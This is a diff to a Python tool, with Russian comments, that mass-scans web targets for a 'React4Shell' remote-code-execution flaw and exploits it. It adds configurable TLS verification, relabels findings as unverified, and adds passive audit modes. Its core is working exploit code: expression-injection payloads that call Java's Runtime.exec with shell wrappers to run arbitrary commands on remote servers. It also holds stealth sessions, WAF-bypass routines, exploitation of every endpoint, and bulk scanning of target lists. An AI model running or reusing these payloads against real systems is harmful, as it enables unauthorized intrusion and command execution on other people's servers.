@@ -22,9 +22,68 @@ import logging
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
-# COMPLETELY DISABLE ALL SSL WARNINGS
 import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+SSL_VERIFY = True
+LOG_EXCEPTIONS = False
+
+
+RETRY_PROFILES = {
+    'default': {'total': 3, 'backoff_factor': 0.4, 'pool_connections': 8, 'pool_maxsize': 16},
+    'safe-audit': {'total': 2, 'backoff_factor': 0.2, 'pool_connections': 6, 'pool_maxsize': 12},
+    'aggressive': {'total': 4, 'backoff_factor': 0.5, 'pool_connections': 10, 'pool_maxsize': 20},
+}
+
+TIMEOUT_PROFILES = {
+    'default': 6,
+    'safe-audit': 5,
+    'aggressive': 8,
+}
+
+ERROR_TAXONOMY = {
+    'timeout': 'NET_TIMEOUT',
+    'connection': 'NET_CONNECTION',
+    'ssl': 'NET_TLS',
+    'http': 'HTTP_ERROR',
+    'json': 'PARSE_JSON',
+    'unknown': 'UNKNOWN',
+}
+
+
+def classify_exception(exc):
+    msg = str(exc).lower()
+    if isinstance(exc, requests.exceptions.Timeout) or 'timeout' in msg:
+        return ERROR_TAXONOMY['timeout']
+    if isinstance(exc, requests.exceptions.SSLError) or 'ssl' in msg or 'certificate' in msg:
+        return ERROR_TAXONOMY['ssl']
+    if isinstance(exc, requests.exceptions.ConnectionError) or 'connection' in msg or 'name or service not known' in msg:
+        return ERROR_TAXONOMY['connection']
+    if isinstance(exc, requests.exceptions.HTTPError):
+        return ERROR_TAXONOMY['http']
+    if isinstance(exc, json.JSONDecodeError):
+        return ERROR_TAXONOMY['json']
+    return ERROR_TAXONOMY['unknown']
+
+
+def configure_runtime_security(insecure=False, verbose_errors=False):
+    """Configure TLS verification and diagnostic verbosity globally."""
+    global SSL_VERIFY, LOG_EXCEPTIONS
+    SSL_VERIFY = not insecure
+    LOG_EXCEPTIONS = verbose_errors
+
+    if insecure:
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        log_event(logging.WARNING, "TLS certificate verification is disabled (--insecure)")
+    else:
+        # Keep warnings enabled in secure mode
+        import warnings
+        warnings.filterwarnings('default', category=urllib3.exceptions.InsecureRequestWarning)
+
+
+def log_swallowed_exception(context, exc):
+    if LOG_EXCEPTIONS:
+        reason_code = classify_exception(exc)
+        log_event(logging.WARNING, f"{context}: {exc}", reason_code=reason_code)
 
 # Simple in-memory caches to avoid redundant discovery work per target
 TECH_FP_CACHE = {}
@@ -294,21 +353,21 @@ def protocol_hopper(url):
         return [url, urllib.parse.urlunparse(parsed._replace(scheme="http"))]
     return [url]
 
-def create_stealth_session():
-    """Create a session with stealth capabilities"""
+def create_stealth_session(profile='default'):
+    """Create a session with deterministic reliability profiles."""
     session = requests.Session()
-    session.verify = False  # Disable SSL verification completely
-    session.timeout = random.uniform(3, 8)  # Random timeout
+    session.verify = SSL_VERIFY
+    session.timeout = TIMEOUT_PROFILES.get(profile, TIMEOUT_PROFILES['default'])
 
-    # Persistent connection pooling with retries to improve reliability
+    cfg = RETRY_PROFILES.get(profile, RETRY_PROFILES['default'])
     retry_strategy = Retry(
-        total=3,
-        backoff_factor=0.4,
+        total=cfg['total'],
+        backoff_factor=cfg['backoff_factor'],
         status_forcelist=[429, 500, 502, 503, 504],
         allowed_methods=["HEAD", "GET", "POST"],
         raise_on_status=False,
     )
-    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=8, pool_maxsize=16)
+    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=cfg['pool_connections'], pool_maxsize=cfg['pool_maxsize'])
     session.mount("http://", adapter)
     session.mount("https://", adapter)
 
@@ -327,32 +386,32 @@ def apply_stealth_delay():
 def parse_sitemap(target_url):
     urls = []
     try:
-        resp = requests.get(urllib.parse.urljoin(target_url, "/sitemap.xml"), timeout=4, verify=False)
+        resp = requests.get(urllib.parse.urljoin(target_url, "/sitemap.xml"), timeout=4, verify=SSL_VERIFY)
         if resp.status_code == 200 and "<urlset" in resp.text:
             for loc in re.findall(r"<loc>([^<]+)</loc>", resp.text):
                 urls.append(loc.strip())
-    except Exception:
-        pass
+    except Exception as exc:
+        log_swallowed_exception('parse_sitemap failed', exc)
     return urls
 
 
 def analyze_js_endpoints(target_url):
     endpoints = []
     try:
-        resp = requests.get(target_url, timeout=4, verify=False)
+        resp = requests.get(target_url, timeout=4, verify=SSL_VERIFY)
         if resp.status_code == 200:
             script_paths = re.findall(r"<script[^>]+src=\"([^\"]+)\"", resp.text)
             for path in script_paths[:8]:  # limit fetches
                 try:
-                    js_resp = requests.get(urllib.parse.urljoin(target_url, path), timeout=4, verify=False)
+                    js_resp = requests.get(urllib.parse.urljoin(target_url, path), timeout=4, verify=SSL_VERIFY)
                     matches = re.findall(r"fetch\(['\"]([^'\"]+)", js_resp.text)
                     endpoints.extend(matches)
                 except Exception:
                     continue
             inline_calls = re.findall(r"fetch\(['\"]([^'\"]+)", resp.text)
             endpoints.extend(inline_calls)
-    except Exception:
-        pass
+    except Exception as exc:
+        log_swallowed_exception('analyze_js_endpoints failed', exc)
     return list({urllib.parse.urlparse(e).path for e in endpoints if e.startswith(("/", "http"))})
 
 
@@ -366,7 +425,7 @@ def enumerate_subdomains(target_url):
         candidate = f"{prefix}.{hostname}"
         for variant in protocol_hopper(candidate):
             try:
-                resp = requests.head(variant, timeout=2, verify=False, allow_redirects=True)
+                resp = requests.head(variant, timeout=2, verify=SSL_VERIFY, allow_redirects=True)
                 if resp.status_code < 500:
                     discovered.append(variant)
             except Exception:
@@ -380,7 +439,7 @@ def tech_fingerprint(target_url):
     if target_url in TECH_FP_CACHE:
         return TECH_FP_CACHE[target_url]
     try:
-        resp = requests.get(target_url, timeout=4, verify=False)
+        resp = requests.get(target_url, timeout=4, verify=SSL_VERIFY)
         text = resp.text.lower()
         hdrs = {k.lower(): v.lower() for k, v in resp.headers.items()}
         fingerprints = []
@@ -1019,7 +1078,7 @@ def check_react4shell(target_url):
                                     'url': target_url,
                                     'endpoint': url,
                                     'status_code': test_resp.status_code,
-                                    'vulnerable': 'Potential',
+                                    'vulnerable': 'Unverified',
                                     'evidence': 'Payload accepted with different response',
                                     'payload_used': current_payload[:100],
                                     'timestamp': datetime.now().isoformat(),
@@ -1047,7 +1106,7 @@ def check_react4shell(target_url):
                                             'url': target_url,
                                             'endpoint': url,
                                             'status_code': get_resp.status_code,
-                                            'vulnerable': 'Potential',
+                                            'vulnerable': 'Unverified',
                                             'evidence': 'GET request accepted with payload',
                                             'method': 'GET',
                                             'payload_used': str(get_payload),
@@ -1072,6 +1131,48 @@ def check_react4shell(target_url):
         'timestamp': datetime.now().isoformat()
     }]
 
+def evaluate_finding_strictness(finding):
+    """Assign status/confidence/reason code using mandatory evidence criteria."""
+    status = finding.get('vulnerable')
+    evidence = (finding.get('evidence') or '').lower()
+    payload_used = bool(finding.get('payload_used'))
+
+    if status == 'Confirmed':
+        return {'status': 'confirmed', 'confidence': 'high', 'reason_code': 'RCE_CONFIRMED_REPRODUCIBLE'}
+
+    if status in ('Unverified', 'Potential'):
+        if payload_used and any(k in evidence for k in ['payload', 'accepted', 'api indicator']):
+            return {'status': 'unverified', 'confidence': 'medium', 'reason_code': 'EVIDENCE_PARTIAL_NEEDS_REPLAY'}
+        return {'status': 'unverified', 'confidence': 'low', 'reason_code': 'HEURISTIC_SIGNAL_ONLY'}
+
+    return {'status': 'not_vulnerable', 'confidence': 'low', 'reason_code': 'NO_EVIDENCE'}
+
+
+def build_siem_schema_report(results, scan_mode='active'):
+    findings = []
+    for r in results:
+        meta = evaluate_finding_strictness(r)
+        findings.append({
+            'target': r.get('url'),
+            'endpoint': r.get('endpoint'),
+            'timestamp': r.get('timestamp'),
+            'status': meta['status'],
+            'confidence': meta['confidence'],
+            'reason_code': meta['reason_code'],
+            'evidence': r.get('evidence'),
+            'status_code': r.get('status_code'),
+            'method': r.get('method'),
+            'raw': r,
+        })
+    return {
+        'schema_version': '1.0',
+        'schema_type': 'react2shell_siem_report',
+        'scan_mode': scan_mode,
+        'generated_at': datetime.now().isoformat(),
+        'findings': findings,
+    }
+
+
 def generate_report(results, output_file):
     if not results:
         return
@@ -1081,14 +1182,15 @@ def generate_report(results, output_file):
     
     # Separate confirmed from potential
     confirmed = [r for r in potential if r.get('vulnerable') == 'Confirmed']
-    potential_only = [r for r in potential if r.get('vulnerable') == 'Potential']
+    potential_only = [r for r in potential if r.get('vulnerable') == 'Unverified']
     
     report = {
         'scan_date': datetime.now().isoformat(),
         'total_scanned': len(results),
         'confirmed_vulnerabilities': len(confirmed),
-        'potential_vulnerabilities': len(potential_only),
-        'results': results
+        'unverified_findings': len(potential_only),
+        'results': results,
+        'siem': build_siem_schema_report(results, scan_mode='active')
     }
     
     # JSON report
@@ -1115,7 +1217,7 @@ def generate_report(results, output_file):
                 f.write("\n")
         
         if potential_only:
-            f.write("POTENTIAL VULNERABILITIES (NEEDS VERIFICATION):\n")
+            f.write("UNVERIFIED FINDINGS (NEEDS VERIFICATION):\n")
             f.write("-" * 70 + "\n")
             for i, vuln in enumerate(potential_only, 1):
                 f.write(f"{i}. {vuln['url']}\n")
@@ -1130,7 +1232,7 @@ def generate_report(results, output_file):
         f.write("SCAN STATISTICS:\n")
         f.write(f"  Total URLs scanned: {report['total_scanned']}\n")
         f.write(f"  Confirmed vulnerabilities: {report['confirmed_vulnerabilities']}\n")
-        f.write(f"  Potential vulnerabilities: {report['potential_vulnerabilities']}\n")
+        f.write(f"  Unverified findings: {report['unverified_findings']}\n")
         f.write(f"  Safe URLs: {report['total_scanned'] - len(potential)}\n")
         
         # Add WAF bypass stats
@@ -1485,7 +1587,76 @@ def aggressive_waf_bypass(target_url, endpoint, method='POST', payload_template=
     
     return results
 
-def exploit_vulnerability(target_url, endpoint, method='POST', payload_template=None, command="id", aggressive=False):
+
+def _escape_java_string(value):
+    """Escape command fragments for Java string payloads."""
+    return value.replace("\\", "\\\\").replace('"', '\\"')
+
+
+def _build_payload_from_template(payload_template, command):
+    """Try to reuse payload template while replacing only the executed command."""
+    if not payload_template or payload_template == 'N/A':
+        return None
+
+    escaped = _escape_java_string(command)
+    try:
+        # Replace explicit placeholder first if present
+        if "COMMAND" in payload_template:
+            return payload_template.replace("COMMAND", escaped)
+
+        pattern = r'exec\\\(\\"([^\\"]*)\\"\\\)'
+        match = re.search(pattern, payload_template)
+        if match:
+            old_cmd = match.group(1)
+            return payload_template.replace(old_cmd, escaped)
+    except Exception:
+        return None
+
+    return None
+
+def _send_payload_request(session, endpoint, method, headers, payload, timeout):
+    if method.upper() == 'GET':
+        params = {"query": payload}
+        return session.get(endpoint, params=params, headers=headers, timeout=timeout)
+    if 'Content-Type' not in headers:
+        headers['Content-Type'] = 'application/json'
+    return session.post(endpoint, data=payload, headers=headers, timeout=timeout)
+
+
+def _strict_verify_execution(session, endpoint, method, headers, timeout, payload_template=None):
+    """Strictly verify command execution using two independent markers plus baseline control."""
+    baseline_payload = json.dumps({"query": "query { __typename }"})
+    try:
+        baseline_resp = _send_payload_request(session, endpoint, method, headers.copy(), baseline_payload, timeout)
+        baseline_text = baseline_resp.text
+    except Exception:
+        baseline_text = ""
+
+    markers = [
+        f"RCE_STRICT_{random.randint(10000, 99999)}",
+        f"RCE_STRICT_{random.randint(10000, 99999)}",
+    ]
+
+    confirmed = 0
+    for marker in markers:
+        attempt_command = f'echo {marker}'
+        payload = _build_payload_from_template(payload_template, attempt_command)
+        if not payload:
+            escaped = _escape_java_string(attempt_command)
+            payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\"{escaped}\")}}}}"}}'
+        try:
+            resp = _send_payload_request(session, endpoint, method, headers.copy(), payload, timeout)
+            text = resp.text
+            if marker in text and marker not in baseline_text:
+                confirmed += 1
+        except Exception as exc:
+            log_swallowed_exception('_strict_verify_execution request failed', exc)
+            continue
+
+    return confirmed >= 2
+
+
+def exploit_vulnerability(target_url, endpoint, method='POST', payload_template=None, command="id", aggressive=False, strict_verify=True):
     """
     Exploit React4Shell vulnerability on a specific target
     """
@@ -1501,45 +1672,69 @@ def exploit_vulnerability(target_url, endpoint, method='POST', payload_template=
     # Create stealth session
     session = create_stealth_session()
     headers = get_random_headers()
-    
+
     # Generate a unique marker to distinguish real output from HTML
     unique_marker = f"RCE_OUTPUT_{random.randint(10000, 99999)}"
-    full_command = f"echo '{unique_marker}' && {command} && echo '{unique_marker}'"
-    
-    payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{full_command}\\")}}}}"}}'
-    
-    if payload_template and payload_template != 'N/A':
+
+    # Runtime.exec(String) does not parse shell operators like &&.
+    # Try shell-wrapped commands first, then direct command fallback.
+    command_attempts = [
+        f'sh -c "echo {unique_marker}; {command}; echo {unique_marker}"',
+        f'/bin/sh -c "echo {unique_marker}; {command}; echo {unique_marker}"',
+        f'cmd /c "echo {unique_marker} & {command} & echo {unique_marker}"',
+        command,
+    ]
+
+    timeout = getattr(session, "timeout", 8)
+    last_error = None
+    response = None
+    used_command = None
+
+    for attempt_command in command_attempts:
+        payload = _build_payload_from_template(payload_template, attempt_command)
+        if payload:
+            print("[+] Using adapted payload from scan template")
+        else:
+            escaped_attempt = _escape_java_string(attempt_command)
+            payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped_attempt}\\")}}}}"}}'
+
         try:
-            pattern = r'exec\\(\\"([^\\"]*)\\"\\)'
-            match = re.search(pattern, payload_template)
-            if match:
-                old_cmd = match.group(1)
-                new_payload = payload_template.replace(old_cmd, full_command)
-                payload = new_payload
-                print(f"[+] Using adapted payload from scan")
-        except:
-            pass
+            used_command = attempt_command
+            response = _send_payload_request(session, endpoint, method, headers.copy(), payload, timeout)
+
+            # break early on responses that can contain useful output
+            if response.status_code in [200, 400, 500]:
+                break
+        except Exception as e:
+            last_error = e
+            response = None
+
+    if response is None:
+        print(f"[!] Exploitation failed: {str(last_error)}")
+        return None
     
     try:
-        if method.upper() == 'GET':
-            params = {"query": payload}
-            response = session.get(endpoint, params=params, headers=headers)
-        else:
-            if 'Content-Type' not in headers:
-                headers['Content-Type'] = 'application/json'
-            response = session.post(endpoint, data=payload, headers=headers)
-        
         print(f"\n[+] Exploitation Results:")
         print(f"    Status Code: {response.status_code}")
         print(f"    Response Time: {response.elapsed.total_seconds():.2f}s")
         print(f"    Response Size: {len(response.text)} chars")
+        if used_command:
+            print(f"    Attempted command form: {used_command[:120]}")
         
         # Check for unique marker first (real RCE proof)
         if unique_marker in response.text:
-            print(f"\n[!] REAL RCE CONFIRMED: Found unique marker '{unique_marker}'!")
-            
+            print(f"\n[!] Marker detected: '{unique_marker}'")
+
+            if strict_verify:
+                print("[+] Running strict verification (2-marker replay + baseline control)...")
+                if not _strict_verify_execution(session, endpoint, method, headers.copy(), timeout, payload_template):
+                    print("[!] Strict verification failed: marker not reproducible across control checks")
+                    return False
+
+            print("[!] REAL RCE CONFIRMED under strict verification")
+
             # Extract output between markers
-            pattern = f"{unique_marker}(.*?){unique_marker}"
+            pattern = f"{re.escape(unique_marker)}(.*?){re.escape(unique_marker)}"
             match = re.search(pattern, response.text, re.DOTALL)
             if match:
                 command_output = match.group(1).strip()
@@ -1648,12 +1843,325 @@ def find_working_endpoint(target_url):
             
             time.sleep(0.3)  # Небольшая задержка
             
-        except Exception:
+        except Exception as exc:
+            log_swallowed_exception('find_working_endpoint probe failed', exc)
             continue
     
     return working_endpoints
 
-def exploit_all_endpoints(target_url, command="id", aggressive=False):
+
+def _marker_variants(marker):
+    """Build harmless encoded marker variants for decoding-behavior checks."""
+    return {
+        'plain': marker,
+        'url': urllib.parse.quote(marker, safe=''),
+        'double_url': urllib.parse.quote(urllib.parse.quote(marker, safe=''), safe=''),
+        'base64': base64.b64encode(marker.encode()).decode(),
+        'unicode': ''.join(f'\\u{ord(ch):04x}' for ch in marker),
+    }
+
+
+def safe_encoding_audit(target_url, endpoints=None):
+    """
+    Safe audit mode: checks how server normalizes/decodes benign encoded markers.
+    Does not use RCE payloads.
+    """
+    print(f"\n[+] Safe encoding audit on {target_url}")
+    session = create_stealth_session()
+    timeout = getattr(session, 'timeout', 8)
+
+    if endpoints is None:
+        working = find_working_endpoint(target_url)
+        endpoints = [w['url'] for w in working if w.get('url')]
+        if not endpoints:
+            candidates = prioritize_endpoints(discover_endpoints(target_url), tech_fingerprint(target_url))
+            endpoints = [urllib.parse.urljoin(target_url.rstrip('/') + '/', ep.lstrip('/')) for ep in candidates[:20]]
+
+    endpoints = list(dict.fromkeys(endpoints))
+    results = []
+
+    for endpoint in endpoints:
+        if interrupted:
+            break
+
+        marker = f"SAFE_AUDIT_{random.randint(10000, 99999)}"
+        variants = _marker_variants(marker)
+
+        endpoint_result = {
+            'endpoint': endpoint,
+            'marker': marker,
+            'decoding_observations': [],
+            'status': []
+        }
+
+        for variant_name, variant_value in variants.items():
+            headers = get_random_headers()
+            headers['Content-Type'] = 'application/json'
+            body = json.dumps({
+                'audit': 'encoding-check',
+                'probe': variant_value,
+                'query': 'query Audit { __typename }',
+                'variables': {'probe': variant_value}
+            })
+
+            try:
+                post_resp = session.post(endpoint, data=body, headers=headers, timeout=timeout)
+                text = post_resp.text
+                endpoint_result['status'].append({'method': 'POST', 'variant': variant_name, 'status_code': post_resp.status_code})
+
+                reflected_plain = marker in text
+                reflected_encoded = variant_value in text
+                if reflected_plain or reflected_encoded:
+                    endpoint_result['decoding_observations'].append({
+                        'method': 'POST',
+                        'variant': variant_name,
+                        'reflected_plain': reflected_plain,
+                        'reflected_encoded': reflected_encoded,
+                    })
+            except Exception as exc:
+                log_swallowed_exception('safe_encoding_audit POST probe failed', exc)
+
+            try:
+                params = {'probe': variant_value, 'audit': 'encoding-check'}
+                get_resp = session.get(endpoint, params=params, headers=headers, timeout=timeout)
+                text = get_resp.text
+                endpoint_result['status'].append({'method': 'GET', 'variant': variant_name, 'status_code': get_resp.status_code})
+
+                reflected_plain = marker in text
+                reflected_encoded = variant_value in text
+                if reflected_plain or reflected_encoded:
+                    endpoint_result['decoding_observations'].append({
+                        'method': 'GET',
+                        'variant': variant_name,
+                        'reflected_plain': reflected_plain,
+                        'reflected_encoded': reflected_encoded,
+                    })
+            except Exception as exc:
+                log_swallowed_exception('safe_encoding_audit GET probe failed', exc)
+
+        if endpoint_result['decoding_observations'] or endpoint_result['status']:
+            results.append(endpoint_result)
+
+    print(f"[+] Safe audit complete: checked {len(endpoints)} endpoints, collected {len(results)} endpoint records")
+    return results
+
+
+def _parse_log4j_versions(text):
+    patterns = [
+        r'log4j(?:-core|-api)?[^0-9]{0,8}(2\.\d+\.\d+)',
+        r'org\.apache\.logging\.log4j[^0-9]{0,20}(2\.\d+\.\d+)',
+    ]
+    versions = set()
+    for pat in patterns:
+        for m in re.findall(pat, text, flags=re.IGNORECASE):
+            versions.add(m)
+    return sorted(versions)
+
+
+def _is_log4j_vulnerable(version):
+    try:
+        parts = tuple(int(x) for x in version.split('.'))
+    except Exception:
+        return False
+    # Known Log4Shell-affected range (2.0-beta9 to 2.14.1)
+    return (2, 0, 0) <= parts <= (2, 14, 1)
+
+
+def safe_log_audit(target_url):
+    """
+    Safe Log2Shell/Log4Shell risk audit without exploitation payloads.
+    Collects passive evidence only.
+    """
+    print(f"\n[+] Safe Log2Shell/Log4Shell audit on {target_url}")
+
+    session = create_stealth_session()
+    timeout = getattr(session, 'timeout', 8)
+    base = target_url.rstrip('/')
+
+    candidate_paths = [
+        '/',
+        '/actuator',
+        '/actuator/env',
+        '/actuator/configprops',
+        '/actuator/loggers',
+        '/actuator/info',
+        '/v2/api-docs',
+        '/v3/api-docs',
+    ]
+
+    findings = {
+        'target': target_url,
+        'checked_paths': [],
+        'versions_detected': [],
+        'risk': 'low',
+        'evidence': [],
+    }
+
+    for path in candidate_paths:
+        url = urllib.parse.urljoin(base + '/', path.lstrip('/'))
+        headers = get_random_headers()
+        try:
+            resp = session.get(url, headers=headers, timeout=timeout)
+        except Exception as exc:
+            log_swallowed_exception('safe_log_audit endpoint probe failed', exc)
+            continue
+
+        findings['checked_paths'].append({'path': path, 'status_code': resp.status_code})
+        text = resp.text[:200000]
+        lower = text.lower()
+
+        if resp.status_code == 200 and path.startswith('/actuator'):
+            findings['evidence'].append(f"Accessible management endpoint: {path}")
+
+        if 'log4j' in lower or 'log4shell' in lower or 'jndilookup' in lower:
+            findings['evidence'].append(f"Log-related indicator on {path}")
+
+        versions = _parse_log4j_versions(text)
+        if versions:
+            for v in versions:
+                if v not in findings['versions_detected']:
+                    findings['versions_detected'].append(v)
+
+    vulnerable_versions = [v for v in findings['versions_detected'] if _is_log4j_vulnerable(v)]
+
+    if vulnerable_versions:
+        findings['risk'] = 'high'
+        findings['evidence'].append(f"Potentially vulnerable log4j versions detected: {', '.join(vulnerable_versions)}")
+    elif findings['evidence']:
+        findings['risk'] = 'medium'
+
+    print(f"[+] Log audit complete: risk={findings['risk']}, versions={findings['versions_detected']}")
+    return findings
+
+
+def safe_dependency_audit(target_url):
+    """Passive dependency leakage checks without exploit payloads."""
+    print(f"\n[+] Safe dependency leakage audit on {target_url}")
+    session = create_stealth_session()
+    timeout = getattr(session, 'timeout', 8)
+
+    paths = [
+        '/actuator/env',
+        '/actuator/info',
+        '/actuator/configprops',
+        '/v2/api-docs',
+        '/v3/api-docs',
+        '/swagger-ui.html',
+        '/swagger-ui/',
+    ]
+    indicators = [
+        'spring-boot', 'log4j', 'logback', 'slf4j', 'jackson', 'tomcat',
+        'netty', 'hibernate', 'reactor', 'snakeyaml', 'commons-', 'org.springframework'
+    ]
+
+    results = {'target': target_url, 'leaks': []}
+    for path in paths:
+        url = urllib.parse.urljoin(target_url.rstrip('/') + '/', path.lstrip('/'))
+        headers = get_random_headers()
+        try:
+            resp = session.get(url, headers=headers, timeout=timeout)
+        except Exception as exc:
+            log_swallowed_exception('safe_dependency_audit endpoint probe failed', exc)
+            continue
+        text = resp.text[:200000]
+        lower = text.lower()
+        found = [ind for ind in indicators if ind in lower]
+        if found:
+            results['leaks'].append({
+                'path': path,
+                'status_code': resp.status_code,
+                'indicators': found[:20],
+            })
+
+    print(f"[+] Dependency audit complete: findings={len(results['leaks'])}")
+    return results
+
+
+def safe_misconfig_audit(target_url):
+    """Passive misconfiguration checks (headers + exposed management endpoints)."""
+    print(f"\n[+] Safe misconfiguration audit on {target_url}")
+    session = create_stealth_session()
+    timeout = getattr(session, 'timeout', 8)
+    headers = get_random_headers()
+
+    findings = {'target': target_url, 'issues': []}
+
+    try:
+        resp = session.get(target_url, headers=headers, timeout=timeout)
+        h = {k.lower(): v for k, v in resp.headers.items()}
+        required = ['x-content-type-options', 'x-frame-options', 'content-security-policy']
+        missing = [r for r in required if r not in h]
+        if missing:
+            findings['issues'].append({'type': 'missing_security_headers', 'missing': missing})
+    except Exception as exc:
+        log_swallowed_exception('safe_misconfig_audit root request failed', exc)
+
+    mgmt_paths = ['/actuator', '/actuator/env', '/actuator/beans', '/actuator/mappings', '/actuator/configprops']
+    for path in mgmt_paths:
+        url = urllib.parse.urljoin(target_url.rstrip('/') + '/', path.lstrip('/'))
+        try:
+            resp = session.get(url, headers=headers, timeout=timeout)
+            if resp.status_code == 200:
+                findings['issues'].append({'type': 'exposed_management_endpoint', 'path': path})
+        except Exception as exc:
+            log_swallowed_exception('safe_misconfig_audit management probe failed', exc)
+            continue
+
+    print(f"[+] Misconfig audit complete: issues={len(findings['issues'])}")
+    return findings
+
+
+def safe_full_audit(target_url):
+    """Run full passive audit family and aggregate strict verdict."""
+    registry = [
+        {'check_id': 'react2shell.passive.encoding', 'vulnerability_family': 'React2Shell', 'recommendation': 'Review input canonicalization and decoding stages.'},
+        {'check_id': 'react4shell.passive.api-surface', 'vulnerability_family': 'React4Shell', 'recommendation': 'Restrict exposed API/debug endpoints and validate expression inputs.'},
+        {'check_id': 'log4shell.passive.version', 'vulnerability_family': 'Log4Shell', 'recommendation': 'Upgrade log4j to patched versions and verify JNDI hardening.'},
+        {'check_id': 'log2shell.passive.misconfig', 'vulnerability_family': 'Log2Shell', 'recommendation': 'Harden logging configuration and management endpoints.'},
+    ]
+
+    encoding = safe_encoding_audit(target_url)
+    log_risk = safe_log_audit(target_url)
+    deps = safe_dependency_audit(target_url)
+    misconfig = safe_misconfig_audit(target_url)
+
+    strict_summary = {
+        'encoding_endpoints_with_observations': sum(1 for e in encoding if e.get('decoding_observations')),
+        'log_risk': log_risk.get('risk', 'low'),
+        'dependency_leak_count': len(deps.get('leaks', [])),
+        'misconfig_issue_count': len(misconfig.get('issues', [])),
+    }
+    strict_summary['overall_risk'] = 'high' if (
+        strict_summary['log_risk'] == 'high' or
+        strict_summary['misconfig_issue_count'] >= 3
+    ) else ('medium' if (
+        strict_summary['encoding_endpoints_with_observations'] > 0 or
+        strict_summary['dependency_leak_count'] > 0 or
+        strict_summary['misconfig_issue_count'] > 0
+    ) else 'low')
+
+    check_matrix = [
+        {'check_id': 'react2shell.passive.encoding', 'evidence': strict_summary['encoding_endpoints_with_observations'], 'recommendation': registry[0]['recommendation']},
+        {'check_id': 'react4shell.passive.api-surface', 'evidence': strict_summary['misconfig_issue_count'], 'recommendation': registry[1]['recommendation']},
+        {'check_id': 'log4shell.passive.version', 'evidence': log_risk.get('versions_detected', []), 'recommendation': registry[2]['recommendation']},
+        {'check_id': 'log2shell.passive.misconfig', 'evidence': misconfig.get('issues', []), 'recommendation': registry[3]['recommendation']},
+    ]
+
+    return {
+        'schema_version': '1.0',
+        'schema_type': 'react2shell_safe_full_audit',
+        'target': target_url,
+        'registry': registry,
+        'check_matrix': check_matrix,
+        'encoding': encoding,
+        'log_risk': log_risk,
+        'dependency_leakage': deps,
+        'misconfiguration': misconfig,
+        'strict_summary': strict_summary,
+    }
+
+
+def exploit_all_endpoints(target_url, command="id", aggressive=False, strict_verify=True):
     """
     Эксплуатировать все endpoints из списка ENDPOINTS
     """
@@ -1688,7 +2196,8 @@ def exploit_all_endpoints(target_url, command="id", aggressive=False):
                     endpoint=endpoint,
                     method='GET',
                     command=command,
-                    aggressive=aggressive
+                    aggressive=aggressive,
+                    strict_verify=strict_verify
                 )
             else:
                 # Для остальных пробуем POST
@@ -1697,7 +2206,8 @@ def exploit_all_endpoints(target_url, command="id", aggressive=False):
                     endpoint=endpoint,
                     method='POST',
                     command=command,
-                    aggressive=aggressive
+                    aggressive=aggressive,
+                    strict_verify=strict_verify
                 )
             
             if result:
@@ -2501,16 +3011,30 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  %(prog)s scan targets.txt results        # Scan targets and save reports
-  %(prog)s exploit report.json            # Load and exploit from report
-  %(prog)s menu                           # Start interactive menu
-  %(prog)s direct http://target.com       # Direct exploitation (tests ALL endpoints)
-  %(prog)s direct http://target.com -e /api/graphql  # Specific endpoint
-  %(prog)s direct http://target.com -a -c "id"       # Aggressive mode with command
-  %(prog)s direct http://target.com --test-all       # Test all endpoints without prompt
-  %(prog)s direct http://target.com --cve-scan       # CVE-specific scan only
+  %(prog)s scan targets.txt results                     # Scan targets and save reports
+  %(prog)s scan targets.txt results -t 50               # Scan with custom threads
+  %(prog)s exploit report.json                          # Load and exploit from report
+  %(prog)s menu                                         # Start interactive menu
+  %(prog)s direct http://target.com                     # Direct exploitation (auto endpoint detection)
+  %(prog)s direct http://target.com -e /api/graphql     # Specific endpoint
+  %(prog)s direct http://target.com -a -c "id"         # Aggressive mode with command
+  %(prog)s direct http://target.com --quick             # Test only common endpoints
+  %(prog)s direct http://target.com --test-all          # Test all endpoints without prompt
+  %(prog)s direct http://target.com --hybrid            # Hybrid exploitation technique
+  %(prog)s direct http://target.com --cve-scan          # CVE-specific scan only
+  %(prog)s direct http://target.com --no-strict-verify  # Disable strict replay verification
+  %(prog)s cve-scan targets.txt -o cve_results.txt      # Mass CVE scanning
+  %(prog)s cve-scan targets.txt -o out.txt -t 40        # Mass CVE scan with threads
+  %(prog)s safe-audit http://target.com                 # Full passive audit family
+  %(prog)s safe-audit http://target.com -o safe.json    # Save passive audit report
+  %(prog)s log-audit http://target.com                  # Safe log risk audit
+  %(prog)s log-audit http://target.com -o log.json      # Save safe log audit report
+  %(prog)s --insecure direct http://target.com           # Insecure TLS mode (legacy behavior)
+  %(prog)s --verbose-errors safe-audit http://target.com # Show swallowed network errors
         """
     )
+    parser.add_argument('--insecure', action='store_true', help='Disable TLS certificate verification (not recommended)')
+    parser.add_argument('--verbose-errors', action='store_true', help='Log swallowed network errors for diagnostics')
     
     subparsers = parser.add_subparsers(dest='mode', help='Operation mode')
     
@@ -2534,12 +3058,23 @@ Examples:
     direct_parser.add_argument('--quick', action='store_true', help='Test only common endpoints')
     direct_parser.add_argument('--cve-scan', action='store_true', help='Perform CVE-specific scan only')
     direct_parser.add_argument('--hybrid', action='store_true', help='Use hybrid exploitation techniques')
+    direct_parser.add_argument('--no-strict-verify', action='store_true', help='Disable strict replay verification for exploit confirmation')
     
     # CVE mass scan mode
     cve_parser = subparsers.add_parser('cve-scan', help='Mass CVE scanning')
     cve_parser.add_argument('input_file', help='File containing target URLs')
     cve_parser.add_argument('-o', '--output', default='cve_results.txt', help='Output file (default: cve_results.txt)')
     cve_parser.add_argument('-t', '--threads', type=int, help='Number of threads to use (default: auto)')
+
+    # Safe audit mode (no RCE payloads)
+    safe_parser = subparsers.add_parser('safe-audit', help='Safe encoding audit without RCE payloads')
+    safe_parser.add_argument('target_url', help='Target URL to audit')
+    safe_parser.add_argument('-o', '--output', help='Optional JSON output file path')
+
+    # Safe Log2Shell/Log4Shell mode (no exploit payloads)
